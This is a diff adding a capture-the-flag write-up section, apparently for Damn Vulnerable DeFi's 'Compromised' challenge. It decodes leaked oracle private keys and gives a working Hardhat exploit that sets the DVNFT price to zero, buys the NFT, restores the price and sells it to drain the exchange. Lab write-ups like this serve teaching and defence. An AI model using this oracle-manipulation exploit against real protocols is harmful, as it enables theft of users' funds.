@@ -448,3 +448,80 @@ fuction queueAction(...) nonReentrant {
 ```
 
 Adding nonReentrant modifiers will separate voting logic from the snapshot creation, this will allow us to drop any transaction that tries to queue an action and update the snapshot in the same transaction like in an attack that we've discussed.
+
+## Challenge #7 - Compromised
+While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. Here’s a snippet:
+
+```
+HTTP/2 200 OK
+content-type: text/html
+content-language: en
+vary: Accept-Encoding
+server: cloudflare
+
+4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
+
+4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
+```
+
+A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each.
+
+This price is fetched from an on-chain oracle, based on 3 trusted reporters: 0xA732...A105,0xe924...9D15 and 0x81A5...850c.
+
+Starting with just 0.1 ETH in balance, pass the challenge by obtaining all ETH available in the exchange.
+
+## Trusted source private keys leak
+
+After a quick look at the oracle contract we see that the only way to manipulate a NFT price is by impersonating the trusted source from which the oracle gets it's prices. Even more we need to impersonate at least two sources because the oracle calculates a median price.
+
+```
+function postPrice(string calldata symbol, uint256 newPrice) external onlyRole(TRUSTED_SOURCE_ROLE) {
+        _setPrice(msg.sender, symbol, newPrice);
+    }
+```
+
+Let's take a look at the encoded message, it seems like these are hex encoded ASCII symbols. Let's decode them.
+
+```
+MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
+MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
+```
+
+Looks like a base64 strings. Decoding them will give us
+
+```
+0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
+0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
+
+```
+
+...private keys(!). Let's hope they belong to oracle sources.
+
+```
+    it('Execution', async function () {
+        /** CODE YOUR SOLUTION HERE */
+        const keys = [
+            '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9',
+            '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'
+        ];
+        let source;
+        for(let i=0; i<keys.length; i++) {
+            source =  new ethers.Wallet(keys[i], ethers.provider);
+            await oracle.connect(source).postPrice("DVNFT", 0);
+        }
+        await exchange.connect(player).buyOne({value: 1});
+
+        for(let i=0; i<keys.length; i++) {
+            source =  new ethers.Wallet(keys[i], ethers.provider);
+            await oracle.connect(source).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        }
+        await nftToken.connect(player).approve(exchange.address, 0);
+        await exchange.connect(player).sellOne(0);
+    });
+```
+
+Success! With sources private keys we managed to lower the NFT price to zero, buy it and after that sell it for it's full price.
+
+### Mitigation
+
+Exposing private keys on the web is never a good idea
